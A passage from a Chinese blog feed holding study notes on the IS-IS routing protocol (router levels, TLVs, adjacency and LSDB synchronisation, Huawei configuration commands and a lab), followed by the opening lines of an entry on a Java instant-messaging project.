ID用来在区域内唯一标识主机或路由器。在设备的实现中，它的长度固定为6Byte。</p><ul><li>System ID通常由root ID扩展得到</li></ul></li></ul><h3 id="IS-IS拓扑结构"><a href="#IS-IS拓扑结构" class="headerlink" title="IS-IS拓扑结构"></a>IS-IS拓扑结构</h3><ul><li>IS-IS在自治系统内采用骨干区域与非骨干区域两级的分层结构：<ul><li>Level-1路由器部署在非骨干区域</li><li>Level-2路由器和Level-1-2路由器部署在骨干区域</li></ul></li><li>每一个非骨干区域都通过Level-1-2路由器与骨干区域相连</li></ul><p><strong>补充IS-IS与OSPF的区别：</strong></p><ul><li>在IS-IS中，每个路由器都只属于一个区域；而在OSPF中，一个路由器的不同接口可以属于不同的区域</li><li>在IS-IS中，单个区域没有骨干与非骨干区域的概念；而在OSPF中，Area0被定义为骨干区域</li><li>在IS-IS中，Level-1和Level-2级别的路由都采用SPF算法，分别生成最短路径树SPT；而在OSPF中，只有在同一个区域内才使用SPF算法，区域之间的路由需要通过骨干区域来转发</li></ul><h4 id="IS-IS路由器的分类"><a href="#IS-IS路由器的分类" class="headerlink" title="IS-IS路由器的分类"></a>IS-IS路由器的分类</h4><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS路由器分类示意图.png" style="zoom:80%;" /><h5 id="Level-1路由器"><a href="#Level-1路由器" class="headerlink" title="Level-1路由器"></a>Level-1路由器</h5><p>Level-1路由器是一种<font color="red">IS-IS区域内部路由器</font>，它<font color="blue">只与属于同一区域的Level-1和Level-1-2路由器形成邻接关系，这种邻接关系称为Level-1邻接关系</font></p><ul><li><p>Level-1路由器无法与Level-2路由器建立邻接关系</p></li><li><p>Level-1路由器只负责维护Level-1的链路状态数据库LSDB，该LSDB只包含本区域的路由信息</p></li><li><p>Level-1路由器必须通过Level-1-2路由器接入IS-IS骨干区域从而访问其他区域。</p></li></ul><p><strong>Level-1-2路由器</strong></p><p>同时属于Level-1和Level-2的路由器称为Level-1-2路由器，它可以与同一区域的Level-1和Level-1-2路由器形成Level-1邻接关系，也可以与其他区域的Level-2和Level-1-2路由器形成Level-2的邻接关系</p><ul><li><font color="orange">Level-1-2路由器也是IS-IS骨干网络的组成部分</font></li><li>Level-1-2路由器维护两个LSDB，Level-1的LSDB用于区域内路由，Level-2的LSDB用于区域间路由</li></ul><p><strong>Level-2路由器</strong><br><font color="red">Level-2路由器，是IS-IS骨干路由器</font>，可以与同一或者不同区域的Level-2路由器或者Level-1-2路由器形成邻接关系</p><ul><li>Level-2路由器维护一个Level-2的LSDB，该LSDB包含整个IS-IS域的所有路由信息</li><li>所有形成Level-2邻接关系的路由器组成路由域的骨干网，负责在不同区域间通信</li><li>路由域中Level-2级别的路由器必须是物理连续的，以保证骨干网的连续性</li></ul><p><strong>IS-IS支持的网络类型：</strong><font color="orange">IS-IS会自动根据接口的数据链路层封装决定该接口的缺省网络类型</font> ， IS-IS支持两种类型的网络，广播Broadcast和点到点P2P网络如PPP、 HDLC等</p><h4 id="IS-IS开销值"><a href="#IS-IS开销值" class="headerlink" title="IS-IS开销值"></a>IS-IS开销值</h4><p>IS-IS使用Cost（开销）作为路由度量值，<font color="red">Cost值越小，则路径越优</font></p><ul><li>IS-IS链路的Cost与设备的接口有关，每一个激活了IS-IS的接口都会维护接口Cost</li><li><font color="blue">IS-IS接口的Cost在缺省情况下并不与接口带宽相关</font>，无论接口带宽多大，<font color="blue">缺省时Cost为10</font></li></ul><p><font color="FF6600">一条IS-IS路径的Cost等于本路由器到达目标网段沿途的<strong>所有链路的Cost总和</strong></font></p><ul><li>IS-IS有三种方式来确定接口的开销，按照优先级由高到低分别是：<ul><li>接口开销：为单个接口设置开销</li><li>全局开销：为所有接口设置开销</li><li>自动计算开销：根据接口带宽自动计算开销</li></ul></li></ul><blockquote><p>在早期的ISO10589中，使能IS-IS的接口下最大只能配置值为63的开销值，此时IS-IS的开销类型为narrow</p></blockquote><blockquote><p>RFC3784中规定，使能IS-IS的接口开销值可以扩展到16777215，此时IS-IS的开销类型为wide</p></blockquote><ul><li>缺省时，华为路由器采用的开销类型是narrow</li><li>narrow类型下使用的TLV：<ul><li>128号TLV（IP Internal Reachability TLV）：用来携带路由域内的IS-IS路由信息</li><li>130号TLV（IP External Reachability TLV）：用来携带路由域外的IS-IS路由信息</li><li>2号TLV(IS Neighbors TLV)：用来携带邻居信息。</li></ul></li><li>wide类型下使用的TLV：<ul><li>135号TLV(Extended IP Reachability TLV)：用来替换原有的IP reachability TLV，携带IS-IS路由信息，它扩展了路由开销值的范围，并可以携带sub TLV</li><li>22号TLV（IS Extended Neighbors TLV）：用来携带邻居信息</li></ul></li></ul><h3 id="IS-IS报文类型"><a href="#IS-IS报文类型" class="headerlink" title="IS-IS报文类型"></a>IS-IS报文类型</h3><p><font color="blue">IS-IS报文是直接封装在数据链路层的帧结构中的</font></p><ul><li>PDU，协议数据单元可以分为两个部分，报文头 IS-IS Header和变长字段部分 Variable Length Fields</li><li>IS-IS Header又可分为通用头部 PDU Common Header和专用头部 PDU Specific Header<ul><li>对于所有PDU来说，通用报头都是相同的，但专用报头根据PDU类型不同而有所差别</li></ul></li></ul><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS报文类型.png" style="zoom:67%;" /><h4 id="IS-IS通用字段详解："><a href="#IS-IS通用字段详解：" class="headerlink" title="IS-IS通用字段详解："></a>IS-IS通用字段详解：</h4><p><strong>重要字段解释：</strong></p><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS通用首部.png" style="zoom: 80%;" /><ul><li>Intradomain Routing Protocol Discriminator：域内路由选择协议鉴别符，固定为0x83</li><li>Length Indicator：IS-IS头部的长度（包括通用头部和专用头部），以Byte为单位</li><li>Version/Protocol ID Extension：版本/协议标识扩展，固定为0x01</li><li>System ID Length：NSAP地址或NET中System ID区域的长度。值为0时，表示System ID区域的长度为6Byte</li><li>R（Reserved）：保留，固定为0</li><li>Version：固定为0x01</li><li>Max.Areas：支持的最大区域个数。设置为1～254的整数，表示该IS-IS进程实际所允许的最大区域地址数；设置为0，表示该IS-IS进程最大只支持3个区域地址数</li></ul><h4 id="IS-IS报文类型概述"><a href="#IS-IS报文类型概述" class="headerlink" title="IS-IS报文类型概述"></a>IS-IS报文类型概述</h4><blockquote><p><font color="fasa">IS-IS的PDU有4种类型：IIH，LSP 链路状态报文，CSNP 全序列号报文，PSNP 部分序列号报文</font></p></blockquote><p><strong>IIH IS-IS Hello报文：用于建立和维持邻接关系</strong></p><ul><li>广播网络中的Level-1 IS-IS路由器使用Level-1 LAN IIH，广播网络中的Level-2 IS-IS路由器使用Level-2 LAN IIH</li><li>点到点网络中则使用P2P IIH</li></ul><p><strong>LSP 链路状态报文：用于交换链路状态信息</strong></p><ul><li>LSP分为两种，Level-1 LSP、Level-2 LSP</li></ul><p><strong>SNP 序列号报文：通过描述全部或部分链路数据库中的LSP来同步各LSDB，从而维护LSDB的完整与同步</strong></p><ul><li>SNP包括CSNP 全序列号报文和PSNP 部分序列号报文，进一步又可分为Level-1 CSNP、 Level-2 CSNP、 Level-1 PSNP和Level-2 PSNP。</li></ul><h4 id="IS-IS常见的TLV"><a href="#IS-IS常见的TLV" class="headerlink" title="IS-IS常见的TLV"></a>IS-IS常见的TLV</h4><p>IS-IS报文首部有一个TLV字段，TLV的含义是：类型（TYPE），长度（LENGTH），值（VALUE）。该字段实际上是一个数据结构，这个结构包含了这三部分</p><blockquote><p>使用TLV结构构建报文的好处是<font color="blue">灵活性和扩展性好</font>。采用TLV使得报文的整体结构固定，增加新特性只需要增加新TLV即可，不需要改变整个报文的整体结构。</p></blockquote><table><thead><tr><th>TLV Type</th><th>名称</th><th>PDU类型</th></tr></thead><tbody><tr><td>1</td><td>Area Addresses                                                  区域地址</td><td>IIH、LSP</td></tr><tr><td>2</td><td>IS Neighbors（LSP）                                         中间系统邻接</td><td>LSP</td></tr><tr><td>4</td><td>Partition Designated Level2 IS                         区域分段指定L2中间系统</td><td>L2、LSP</td></tr><tr><td>6</td><td>IS Neighbors（MAC Address）                        中间系统邻接</td><td>LAN、IIH</td></tr><tr><td>7</td><td>IS Neighbors（SNPA Address）                       中间系统邻接</td><td>LAN、IIH</td></tr><tr><td>8</td><td>Padding                                                                填充</td><td>IIH</td></tr><tr><td>9</td><td>LSP Entries                                                           LSP条目</td><td>SNP</td></tr><tr><td>10</td><td>Authentication Information                              验证信息</td><td>IIH、LSP、SNP</td></tr><tr><td>128</td><td>IP Internal Reachability Information               IP内部可达性信息</td><td>LSP</td></tr><tr><td>129</td><td>Protocols Supported                                          支持的协议</td><td>IIH、LSP</td></tr><tr><td>130</td><td>IP External Reachability Information              IP外部可达性信息</td><td>LSP</td></tr><tr><td>131</td><td>Inter-Domain Routing Protocol Information 域间路由选择协议信息</td><td>L2、 LSP</td></tr><tr><td>132</td><td>IP Interface Address                                          IP接口地址</td><td>IIH 、LSP</td></tr></tbody></table><h2 id="IS-IS工作原理"><a href="#IS-IS工作原理" class="headerlink" title="IS-IS工作原理"></a>IS-IS工作原理</h2><h3 id="IS-IS邻接关系建立原则"><a href="#IS-IS邻接关系建立原则" class="headerlink" title="IS-IS邻接关系建立原则"></a>IS-IS邻接关系建立原则</h3><ul><li><p>IS-IS按如下原则建立邻接关系：</p><ul><li>只有同一层次的相邻路由器才有可能成为邻接</li><li>对于Level-1路由器来说，Area ID必须一致</li><li>链路两端IS-IS接口的网络类型必须一致</li><li>链路两端IS-IS接口的地址必须处于同一网段</li></ul></li><li><p>IS-IS是直接运行在数据链路层上的协议，并且最早设计是给CLNP使用的，IS-IS邻接关系的形成与IP地址无关</p></li><li><p>在实际的部署中，在IP网络上运行IS-IS时，需要检查对方的IP地址的。如果接口配置了从IP，那么只要双方有某个IP在同一网段，就能建立邻接，不一定要主IP相同。</p></li></ul><h5 id="在以太网中的额外原则："><a href="#在以太网中的额外原则：" class="headerlink" title="在以太网中的额外原则："></a>在以太网中的额外原则：</h5><ul><li>通过将以太网接口模拟成点到点接口，可以建立点到点链路邻接关系</li><li>当链路两端IS-IS接口的地址不在同一网段时，如果配置接口对接收的Hello报文不作IP地址检查，也可以建立邻接关系<ul><li>对于点到点接口，可以配置接口忽略IP地址检查</li><li>对于以太网接口，需要将以太网接口模拟成点到点接口，然后才可以配置接口忽略IP地址检查</li></ul></li><li>一般情况下，一个接口只需配置一个主IP地址，但在有些特殊情况下需要配置从IP地址</li></ul><h5 id="IIH报文"><a href="#IIH报文" class="headerlink" title="IIH报文"></a>IIH报文</h5><p>IIH报文用于建立和维持邻接关系，广播网络中的Level-1 IS-IS路由器使用Level-1 LAN IIH；广播网络中的Level-2 IS-IS路由器使用Level-2 LAN IIH；点到点网络中则使用P2P IIH</p><ul><li>Reserved/Circuit Type：表示路由器的类型 01表示L1，10表示L2，11表示L1/L2</li><li>Source ID  ：发出Hello报文的路由器的System ID</li><li>Holding Time ： 保持时间。在此时间内如果没有收到邻接发来的Hello报文，则中止已建立的邻接关系</li><li>Priority ：选举DIS的优先级，取值范围为0～127。数值越大，优先级越高。该字段只在广播网中的Hello消息(LAN IIH消息)携带；点到点网络的Hello消息(P2P IIH消息)没有此字段，也没有此字段之前的R保留位</li><li>LAN ID： 包括DIS的System ID和伪节点ID。该字段只在广播网中的Hello消息(LAN IIH消息)携带；点到点网络的Hello消息(P2P IIH消息)没有此字段</li><li>Local Circuit ID：本地链路ID，该字段只在点到点网络的Hello消息(P2P IIH消息)携带；广播网中的Hello消息(LAN IIH消息)没有此字段。 </li></ul><h4 id="广播网络中的邻接关系建立过程"><a href="#广播网络中的邻接关系建立过程" class="headerlink" title="广播网络中的邻接关系建立过程"></a>广播网络中的邻接关系建立过程</h4><p>两台运行IS-IS的路由器在交互协议报文实现路由功能之前必须首先建立邻接关系。在不同类型的网络上，IS-IS的邻接建立方式并不相同。在广播网络中，使用三次握手建立邻接关系</p><ol><li>在Down状态下，R1组播发送Level-1 LAN IIH，此报文中邻接列表为空</li><li>R2收到此报文后，将邻接状态标识为Initial。R2再向R1回复Level-1 LAN IIH，此报文中标识R1为R2的邻接</li><li>R1收到此报文后，将自己与R2的邻接状态标识为Up。再向R2发送一个标识R2为R1邻接的Level-1 LAN IIH</li><li>R2收到此报文后，将自己与R1的邻接状态标识为Up。这样，两个路由器成功建立了邻接关系</li><li>广播网络中需要选举DIS，在邻接关系建立后，路由器会等待两个Hello报文间隔，再进行DIS的选举。</li></ol><h5 id="DIS与伪节点"><a href="#DIS与伪节点" class="headerlink" title="DIS与伪节点"></a>DIS与伪节点</h5><p>在广播网络中，IS-IS需要在所有的路由器中选举一个路由器作为DIS (指定中间系统) </p><ul><li>DIS用来创建和更新伪节点（Pseudonodes），并负责生成伪节点的LSP，用来描述网络上有哪些网络设备</li><li>伪节点是用来模拟广播网络的一个虚拟节点，并非真实的路由器。在IS-IS中，伪节点用DIS的System ID和Circuit ID（非0值）标识</li></ul><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS DIS与伪结点.png" style="zoom: 67%;" /><h4 id="点到点网络中的邻接关系建立过程"><a href="#点到点网络中的邻接关系建立过程" class="headerlink" title="点到点网络中的邻接关系建立过程"></a>点到点网络中的邻接关系建立过程</h4><p>点到点网络中，邻接关系的建立使用两次握手方式：只要路由器收到对端发来的Hello报文，就单方面宣布邻接为Up状态，建立邻接关系<br>两次握手机制存在明显的缺陷，华为设备在点到点网络中使用IS-IS时，默认使用三次握手建立邻接关系。此方式通过三次发送P2P IIH最终建立起邻接关系</p><h3 id="链路状态数据库同步"><a href="#链路状态数据库同步" class="headerlink" title="链路状态数据库同步"></a>链路状态数据库同步</h3><h4 id="LSP"><a href="#LSP" class="headerlink" title="LSP"></a>LSP</h4><p>IS-IS链路状态报文LSP用于交换链路状态信息。LSP分为两种：Level–1 LSP和Level–2 LSP。Level–1 LSP由Level-1路由器传送，Level–2 LSP由Level-2路由器传送，Level-1-2路由器则可传送以上两种LSP</p><p>两类LSP有相同的报文格式</p><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/LSP报文格式.png" style="zoom:80%;" /><ul><li><strong>Remaining Lifetime</strong> : LSP的生存时间，以秒为单位</li><li><strong>LSP ID</strong>:由三部分组成，System ID、伪节点ID和LSP分片后的编号</li><li><strong>Sequence Number</strong>: LSP的序列号。在路由器启动时所发送的第一个LSP报文中的序列号为1，以后当需要生成新的LSP时，新LSP的序列号在前一个LSP序列号的基础上加1。更高的序列号意味着更新的LSP</li><li>Checksum ： LSP的校验和</li><li><strong>ATT</strong>（Attachment）：由Level-1-2路由器产生，用来指明始发路由器是否与其它区域相连。虽然此标志位也存在于Level-1和Level-2的LSP中，但实际上此字段只和Level-1-2路由器始发的L1 LSP有关</li><li>OL（LSDB Overload，1bit）：过载标志位。设置了过载标志位的LSP虽然还会在网络中扩散，但是在计算通过超载路由器的路由时不会被采用。即对路由器设置过载位后，其它路由器在进行SPF计算时不会考虑这台路由器。当路由器内存不足时，系统自动在发送的LSP报文中设置过载标志位</li><li>IS Type(2bit)：生成LSP的路由器的类型。用来指明是Level-1还是Level-2路由器（01表示Level-1，11表示Level-2）</li></ul><h5 id="CSNP："><a href="#CSNP：" class="headerlink" title="CSNP："></a>CSNP：</h5><p>CSNP包含该设备LSDB中所有的LSP摘要，路由器通过交互 CSNP来判断是否需要同步LSDB</p><ul><li>在广播网络上，CSNP由DIS定期发送    缺省的发送周期为10秒</li><li>在点到点网络上，CSNP只在第一次建立邻接关系时发送</li></ul><p><strong>CSNP报文格式：</strong></p><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/CNSP报文格式.png" style="zoom:67%;" /><ul><li>Source ID：发出CSNP报文的路由器的System ID</li><li>Start LSP：CSNP报文中第一个LSP的ID值</li><li>End LSP ID：CSNP报文中最后一个LSP的ID值</li></ul><h5 id="PSNP："><a href="#PSNP：" class="headerlink" title="PSNP："></a>PSNP：</h5><p>PSNP只包含部分LSP的摘要信息 ：</p><ul><li>当发现LSDB不同步时，PSNP来请求邻居发送新的LSP</li><li>在点到的网络中，当收到LSP时，使用PSNP对收到的LSP进行确认</li></ul><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/PSNP报文格式.png"  /><ul><li>Source ID：发出PSNP报文的路由器的System ID。 </li></ul><h4 id="LSP的同步过程"><a href="#LSP的同步过程" class="headerlink" title="LSP的同步过程"></a>LSP的同步过程</h4><h5 id="广播网络中LSP的同步过程"><a href="#广播网络中LSP的同步过程" class="headerlink" title="广播网络中LSP的同步过程:"></a>广播网络中LSP的同步过程:</h5><ul><li><p>广播网络中新加入路由器与DIS同步LSDB数据库的过程：</p><ol><li><p>新加入的路由器R3首先发送IIH报文，与该广播域中的路由器建立邻接关系。建立邻接关系之后，R3等待LSP刷新定时器超时，然后将自己的LSP发往组播地址（Level-1：01-80-C2-00-00-14；Level-2：01-80-C2-00-00-15）。这样网络上所有的邻接都将收到该LSP</p></li><li><p>该网段中的DIS会把收到R3的LSP加入到LSDB中，并等待CSNP报文定时器超时并发送CSNP报文</p></li><li><p>R3收到DIS发来的CSNP报文，对比自己的LSDB数据库，然后向DIS发送PSNP报文请求自己没有的LSP</p></li><li><p>DIS收到该PSNP报文请求后向R3发送对应的LSP进行LSDB的同步</p><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/广播网络中LSP的同步过程.png" alt="广播网络中LSP的同步过程" style="zoom:80%;" /></li></ol></li></ul><h5 id="点到点网络中LSP的同步过程"><a href="#点到点网络中LSP的同步过程" class="headerlink" title="点到点网络中LSP的同步过程"></a>点到点网络中LSP的同步过程</h5><ul><li><p>点到点网络上LSDB数据库的同步过程：</p><ul><li><p>R1先与R2建立邻接关系。</p></li><li><p>建立邻接关系之后，R1与R2会先发送CSNP给对端设备。如果对端的LSDB与CSNP没有同步，则发送PSNP请求索取相应的LSP</p></li><li><p>假设R2向R1索取相应的LSP</p><ol><li><p>R1发送R2请求的LSP的同时启动LSP重传定时器，并等待R2发送的PSNP作为收到LSP的确认</p></li><li><p>如果在接口LSP重传定时器超时后，R1没有收到R2发送的PSNP报文作为应答</p></li><li><p>则R1重新发送该LSP</p></li><li><p>R2收到LSP后，发送PSNP进行确认</p><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/点到点网络中LSP同步过程.png" style="zoom:67%;" /></li></ol></li></ul></li></ul><p><strong>LSP产生的原因，IS-IS路由域内的所有路由器都会产生LSP，以下事件会触发一个新的LSP：</strong></p><blockquote><ul><li>邻接Up或Down，IS-IS相关接口Up或Down，引入的IP路由发生变化，区域间的IP路由发生变化，接口被赋了新的metric值，周期性更新（刷新间隔15min）</li></ul></blockquote><h4 id="LSP的处理机制"><a href="#LSP的处理机制" class="headerlink" title="LSP的处理机制"></a>LSP的处理机制</h4><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/LSP的处理机制.png" style="zoom: 80%;" /><p>IS-IS通过交互LSP实现链路状态数据库同步，路由器收到LSP后，按照以下原则处理：</p><ul><li>若收到的LSP比本地LSP的更优，或者本地没有收到的LSP：<ul><li>在广播网络中：将其加入数据库，并组播发送新的LSP</li><li>在点到点网络中：将其加入数据库，并发送PSNP报文来确认收到此LSP，之后将这新的LSP发送给除了发送该LSP的邻居以外的邻居</li></ul></li><li>若收到的LSP和本地LSP无法比较出优劣，则不处理该LSP</li></ul><h3 id="路由计算"><a href="#路由计算" class="headerlink" title="路由计算"></a>路由计算</h3><h4 id="Level-1路由器的路由计算"><a href="#Level-1路由器的路由计算" class="headerlink" title="Level-1路由器的路由计算"></a>Level-1路由器的路由计算</h4><ul><li>R1是Level-1路由器，只维护Level-1 LSDB，该LSDB中包含同属一个区域的R2及R3以及R1自己产生的Level-1 LSP</li><li>R1根据LSDB中的Level-1 LSP计算出Area 49.0001内的拓扑，以及到达区域内各个网段的路由信息</li><li>R2及R3作为Area 49.0001内的Level-1-2路由器，会在它们向该区域下发的Level-1 LSP中设置ATT标志位，用于向区域内的Level-1路由器宣布可以通过自己到达其他区域。 R1作为Level-1路由器，会根据该ATT标志位，计算出指向R2或R3的默认路由</li></ul><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/Level-1路由器的路由计算.png" alt="Level-1路由器的路由计算" style="zoom:80%;" /><h5 id="Level-1路由器的次优路径的问题"><a href="#Level-1路由器的次优路径的问题" class="headerlink" title="Level-1路由器的次优路径的问题"></a>Level-1路由器的次优路径的问题</h5><p>缺省时， R1只能通过指向R2或R3的默认路由到达区域外部，但是R1距离R2和R3路由器的Cost值相等，那么当R1发送数据包到192.168.20.0/24时，就有可能选择路径2，导致出现次优路径。</p><h5 id="路由渗透"><a href="#路由渗透" class="headerlink" title="路由渗透"></a>路由渗透</h5><p>缺省情况下，Level-1-2路由器不会将到达其他区域的路由通告本Level-1区域中。<br>通过路由渗透，可以将区域间路由通过Leve-1-2路由器传递到Level-1区域，此时Leve-1路由器可以学习到其他区域的详细路由，从而计算出最优路径。</p><h4 id="Level-1-2路由器的路由计算"><a href="#Level-1-2路由器的路由计算" class="headerlink" title="Level-1-2路由器的路由计算"></a>Level-1-2路由器的路由计算</h4><p>R2及R3都维护Level-1 LSDB，它们能够通过这些LSDB中的LSP计算出Area 49.0001的路由。<br>R2及R3都维护Level-2 LSDB，它们能够通过这些LSDB中的LSP计算出Area 49.0002的路由。<br>R2及R3将到达Area 49.0001的路由以Level-2 LSP的形式发送到Area 49.0002。</p><h4 id="Level-2路由器的路由计算"><a href="#Level-2路由器的路由计算" class="headerlink" title="Level-2路由器的路由计算"></a>Level-2路由器的路由计算</h4><p>R4及R5作为Level-2路由器，只会维护Level-2 LSDB，它们能够根据该LSDB计算出到达全网各个网段的路由。</p><h2 id="IS-IS的基本配置"><a href="#IS-IS的基本配置" class="headerlink" title="IS-IS的基本配置"></a>IS-IS的基本配置</h2><h3 id="IS-IS协议的基本配置"><a href="#IS-IS协议的基本配置" class="headerlink" title="IS-IS协议的基本配置"></a>IS-IS协议的基本配置</h3><p>1 . 创建IS-IS进程，进入IS-IS进程</p><pre class="line-numbers language-none"><code class="language-none">isis [process-id] <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数process-id用来指定一个IS-IS进程,如果不指定参数process-id，则系统默认的进程为1</p><p>2 . 配置网络实体名称</p><pre class="line-numbers language-none"><code class="language-none">network-entity net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通常情况下，一个IS-IS进程下配置一个NET即可。当区域需要重新划分时，例如将多个区域合并，或者将一个区域划分为多个区域，这种情况下配置多个NET可以在重新配置时仍然能够保证路由的正确性。由于一个IS-IS进程中区域地址最多可配置3个，所以NET最多也只能配3个。在配置多个NET时，必须保证它们的System ID都相同</p><p>3 . 配置全局Level级别</p><pre class="line-numbers language-none"><code class="language-none">is-level &#123; level-1 | level-1-2 | level-2 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，设备的Level级别为level-1-2。</p><ul><li>在网络运行过程中，改变IS-IS设备的级别可能会导致IS-IS进程重启并可能会造成IS-IS邻居断连，建议用户在配置IS-IS时即完成设备级别的配置。 </li></ul><p>4 . 在接口上使能IS-IS协议</p><pre class="line-numbers language-none"><code class="language-none">isis enable [ process-id ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在接口视图下配置该命令后，IS-IS将通过该接口建立邻居、扩散LSP报文。</p><p>5 .  配置接口Level级别</p><pre class="line-numbers language-none"><code class="language-none">isis circuit-level [ level-1 | level-1-2 | level-2 ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，接口的Level级别为level-1-2。<br>两台Level-1-2设备建立邻居关系时，缺省情况下，会分别建立Level-1和Level-2邻居关系。如果只希望建立Level-1或者Level-2的邻居关系，可以通过修改接口的Level级别实现。</p><p>6 .  修改接口的DIS优先级</p><pre class="line-numbers language-none"><code class="language-none">isis dis-priority priority [level-1 | level-2]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，IS-IS接口DIS优先级为64，该命令用来指定挑选对应层次DIS（Designated Intermediate System）时接口的优先级</p><h3 id="IS-IS配置实验："><a href="#IS-IS配置实验：" class="headerlink" title="IS-IS配置实验："></a>IS-IS配置实验：</h3><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS配置实验拓扑.png" /><h4 id="配置接口IP"><a href="#配置接口IP" class="headerlink" title="配置接口IP"></a>配置接口IP</h4><h4 id="配置IS-IS基本功能"><a href="#配置IS-IS基本功能" class="headerlink" title="配置IS-IS基本功能"></a>配置IS-IS基本功能</h4><h5 id="配置R1"><a href="#配置R1" class="headerlink" title="# 配置R1"></a># 配置R1</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R1] isis 1[R1-isis-1] is-level level-1[R1-isis-1] network-entity 10.0000.0000.0001.00[R1-isis-1] quit[R1] interface gigabitethernet 0&#x2F;0&#x2F;0[R1-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R1-GigabitEthernet0&#x2F;0&#x2F;0] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R3"><a href="#配置R3" class="headerlink" title="# 配置R3"></a># 配置R3</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R3] isis 1[R3-isis-1] is-level level-1[R3-isis-1] network-entity 10.0000.0000.0003.00[R3-isis-1] quit[R3] interface gigabitethernet 0&#x2F;0&#x2F;0[R3-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R3-GigabitEthernet0&#x2F;0&#x2F;0] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R2"><a href="#配置R2" class="headerlink" title="# 配置R2"></a># 配置R2</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R2] isis 1[R2-isis-1] network-entity 10.0000.0000.0002.00[R2-isis-1] quit[R2] interface gigabitethernet 0&#x2F;0&#x2F;0[R2-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R2-GigabitEthernet0&#x2F;0&#x2F;0] quit[R2] interface gigabitethernet 0&#x2F;0&#x2F;1[R2-GigabitEthernet0&#x2F;0&#x2F;1] isis enable 1[R2-GigabitEthernet0&#x2F;0&#x2F;2] quit[R2] interface gigabitethernet 3&#x2F;0&#x2F;0[R2-GigabitEthernet0&#x2F;0&#x2F;2] isis enable 1[R2-GigabitEthernet0&#x2F;0&#x2F;2] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R4"><a href="#配置R4" class="headerlink" title="# 配置R4"></a># 配置R4</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R4] isis 1[R4-isis-1] is-level level-2[R4-isis-1] network-entity 20.0000.0000.0004.00[R4-isis-1] quit[R4] interface gigabitethernet0&#x2F;0&#x2F;0[R4-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R4-GigabitEthernet0&#x2F;0&#x2F;0] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;center&gt;&lt;h1&gt;中间系统到中间系统 IS-IS&lt;/h1&gt;&lt;/center&gt;
[TOC]

&lt;blockquote&gt;
&lt;p&gt;&lt;font color=&quot;blue&quot;&gt;IS-IS是ISO为CLNP[&lt;font color=&quot;black&quot;&gt;ConnectionLessNetwork</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="IS-IS" scheme="https://shierjinghuang.github.io/tags/IS-IS/"/>
    
  </entry>
  
  <entry>
    <title>Java项目 即时通讯系统</title>
    <link href="https://shierjinghuang.github.io/2023/03/18/Java%E5%AE%9E%E8%AE%AD/"/>
    <id>https://shierjinghuang.github.io/2023/03/18/Java%E5%AE%9E%E8%AE%AD/</id>
    <published>2023-03-18T01:25:00.000Z</published>
    <updated>2023-04-09T07:30:00.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="即时通讯系统"><a href="#即时通讯系统" class="headerlink" title="即时通讯系统"></a>即时通讯系统</h2><h3 id="1-系统概述"><a href="#1-系统概述" class="headerlink" title="1  系统概述"></a>1  系统概述</h3><blockquote><p><font color=blue>即时通讯是一款基于互联网的即时通讯软件，旨在为企业提供高效、安全、便捷的沟通工具。</font></p><p>本项目是一个基于Java语言开发的企业QQ系统，是基于C/S模型实现。系统可分为两个部分，服务端和客户端。服务端的工作主要是来监听和接收来自客户端的请求，然后存储并处理客户端发来的消息，并通知客户端。而客户端的功能是能够让新用户注册，通过用户名密码登陆并且使用该系统。通过服务端和客户端的协同工作最终使用户能够使用该程序，完成用户和用户之间的沟通。</p></blockquote><h4 id="1-1-功能概述"><a href="#1-1-功能概述" class="headerlink" title="1.1 功能概述"></a>1.1 